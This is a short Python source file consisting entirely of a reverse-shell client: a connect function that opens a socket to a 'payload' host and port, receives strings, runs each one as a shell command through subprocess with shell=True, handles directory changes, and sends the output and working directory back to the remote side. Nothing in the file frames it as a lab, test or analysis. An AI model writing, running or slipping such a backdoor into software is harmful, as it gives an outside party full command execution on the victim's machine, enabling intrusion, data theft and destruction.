import socket
import subprocess
import os

def connect(payload_host, payload_port):
    s = socket.socket()
    host = payload_host
    port = payload_port
    connected = False

    while not connected:
        try:
            s.connect((host, port))
            connected = True

            while True:
                data = s.recv(10240)

                if data[:2].decode("utf-8") == 'cd':
                    os.chdir(data[3:].decode("utf-8"))

                if len(data) > 0:
                    cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                    output_byte = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_byte,"utf-8")
                    currentWD = os.getcwd() + "> "
                    s.send(str.encode(output_str + currentWD))


        except Exception as error:
            print(error)